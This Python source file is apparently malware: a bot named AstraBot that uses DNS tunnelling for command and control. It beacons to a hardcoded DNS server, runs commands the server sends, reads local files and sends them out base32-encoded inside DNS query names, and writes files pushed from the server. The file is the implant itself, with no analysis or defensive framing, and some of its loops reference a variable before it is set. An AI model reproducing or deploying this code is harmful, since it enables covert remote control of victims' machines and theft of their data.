import socket, sys
import random
import string
import subprocess
from time import sleep
from base64 import b32encode

def encode32str(encoded_string):
    encoded_bytes = b32encode(encoded_string.encode('utf-8'))
    encoded_string = encoded_bytes.decode('utf-8')
    return encoded_string

def encode32byte(encoded_bytes):
    encoded_bytes = b32encode(encoded_bytes)
    encoded_string = encoded_bytes.decode('utf-8')
    return encoded_string

class AstraBot(object):
    def __init__(self, dns_server):
        self.bot_id = self.gen_bot_id()
        self.dns_server = dns_server
        self.bytes_headers = {
            b'\x00\x01':['exec',b'\x00\x02'],
            b'\x01\x01':['download', b'\x01\x02'], # from bot to server
            b'\x02\x01':['upload', b'\x02\x02'], # from server to bot
        }
        self.current_proc = None
        self.stop_bytes = None
        self.proc_bytes = []
        self.response_bytes = None

    def gen_bot_id(self):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=6))

    def generate_request(self, msg_type, msg_status, data):
        if data == None:
            data = 'none'
        if msg_type == 'ping':
            msg_type = 'p'
        if msg_type == 'download':
            msg_type = 'd'
            if msg_status == 'transfer':
                msg_status = 't'
            if msg_status == 'end':
                msg_status = 'e'
        if msg_type == 'text':
            msg_type = 't'
            if msg_status == 'transfer':
                msg_status = 't'
            if msg_status == 'end':
                msg_status = 'e'
        if msg_type == 'upload':
            msg_type = 'u'
            if msg_status == 'transfer':
                msg_status = 't'
            if msg_status == 'end':
                msg_status = 'e'
        #print(f"{self.bot_id}-{msg_type}-{msg_status}-{data}.com")
        return f"{self.bot_id}-{msg_type}-{msg_status}-{data}.com"

    

    def extract_ip_addresses(self, data):
        ip_addresses = []
        offset = 12
        while True:
            while True:
                length = data[offset]
                offset += 1
                if length == 0:
                    break
                elif length >= 192:
                    offset += 1
                    break
                else:
                    offset += length
            offset += 4
            offset += 4
            data_length = int.from_bytes(data[offset:offset+2], byteorder='big')
            offset += 2
            ip_address = data[offset:offset+data_length]
            ip_addresses.append(ip_address)
            offset += data_length
            if offset >= len(data):
                break
        return ip_addresses
    

    def create_dns_query(self, domain):
        # Формируем DNS-запрос типа A (IPv4)
        query = bytearray()
        query += bytearray.fromhex('AA AA')  # Идентификатор запроса
        query += bytearray.fromhex('01 00')  # Флаги
        query += bytearray.fromhex('00 01')  # Количество вопросов
        query += bytearray.fromhex('00 00')  # Количество ответов
        query += bytearray.fromhex('00 00')  # Количество авторитетных записей
        query += bytearray.fromhex('00 00')  # Количество дополнительных записей
        
        # Разбиваем доменное имя на отдельные части
        labels = domain.split('.')
        
        # Добавляем каждую часть в запрос
        for label in labels:
            query += bytes([len(label)]) + label.encode()
        query += bytearray.fromhex('00')  # Завершающий ноль
        query += bytearray.fromhex('00 01')  # Тип запроса (A)
        query += bytearray.fromhex('00 01')  # Класс запроса (IN)
        return query
    
    def proc_action(self):
        if self.current_proc == 'exec':
            self.response_bytes = subprocess.check_output(self.proc_bytes.decode('utf-8').split(' '))
        if self.current_proc == 'download':
            filepath = self.proc_bytes.decode('utf-8')
            filename = filepath.split('/')[-1]
            print(filepath, filename)
            with open(filepath, "rb") as file:
                self.response_bytes = file.read()
        if self.current_proc == 'upload': 
            filepath = self.proc_bytes[:256]
            filepath = b''.join([byte for byte in filepath if byte != b'\x00'])
            filedata = self.proc_bytes[256:]
            with open(filepath.decode('utf-8'), "wb") as file:
                file.write(filedata)
        
    def decode_response_data(self, response_data):
        if response_data != b'\xff':
            print(response_data, self.current_proc)
        if response_data != None:
            if response_data[:2] in self.bytes_headers.keys() and self.current_proc == None:
                self.current_proc = self.bytes_headers[response_data[:2]][0]
                self.stop_bytes = self.bytes_headers[response_data[:2]][1]
                self.proc_bytes.append(response_data[2:])
            elif len(response_data) == 2 and response_data == self.stop_bytes and self.current_proc != None:
                self.proc_bytes = b''.join(self.proc_bytes)
                self.proc_action()
            elif self.current_proc != None:
                self.proc_bytes.append(response_data)

    def resolve_dns(self,domain):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2)
            sock.sendto(self.create_dns_query(domain), (self.dns_server, 53))
            data, addr = sock.recvfrom(1024)
            ip_addresses = self.extract_ip_addresses(data)
            return ip_addresses[0]
        except socket.timeout:
            print("DNS-сервер не ответил")
        finally:
            sock.close()

    def ping_c2(self):
        while True:
            if self.response_bytes != None:
                if self.current_proc == 'exec':
                    while True:
                        if len(response_data) == 0:
                            break
                        response_data = self.response_bytes[:32]
                        self.response_bytes = self.response_bytes[32:]
                        request_str = self.generate_request('text', 'transfer', encode32byte(response_data))
                        while self.resolve_dns(request_str) != b'\xff':
                            sleep(1)
                    request_str = self.generate_request('text', 'end', None)
                    self.resolve_dns(request_str)
                    self.current_proc = None
                    self.proc_bytes = []
                    self.stop_bytes = None
                    self.response_bytes = None
                if self.current_proc == 'download':
                    while True:
                        if len(response_data) == 0:
                            break
                        response_data = self.response_bytes[:32]
                        self.response_bytes = self.response_bytes[32:]
                        request_str = self.generate_request(self.current_proc, 'transfer', encode32byte(response_data))
                        while self.resolve_dns(request_str) != b'\xff':
                            sleep(1)
                    request_str = self.generate_request(self.current_proc, 'end', None)
                    self.resolve_dns(request_str)
                    self.current_proc = None
                    self.proc_bytes = []
                    self.stop_bytes = None
                    self.response_bytes = None
                if self.current_proc == 'upload':
                    while True:
                        if len(response_data) == 0:
                            break
                        response_data = self.response_bytes[:32]
                        self.response_bytes = self.response_bytes[32:]
                        request_str = self.generate_request(self.current_proc, 'transfer', encode32byte(response_data))
                        while self.resolve_dns(request_str) != b'\xff':
                            sleep(1)
                    request_str = self.generate_request(self.current_proc, 'end', None)
                    self.resolve_dns(request_str)
                    self.current_proc = None
                    self.proc_bytes = []
                    self.stop_bytes = None
                    self.response_bytes = None
            request_str = self.generate_request('ping', '', '')
            response_data = self.resolve_dns(request_str)
            self.decode_response_data(response_data)
            sleep(1)

    def start(self):
        self.ping_c2()

if __name__ == "__main__":
    bot = AstraBot("192.168.1.29")
    bot.start()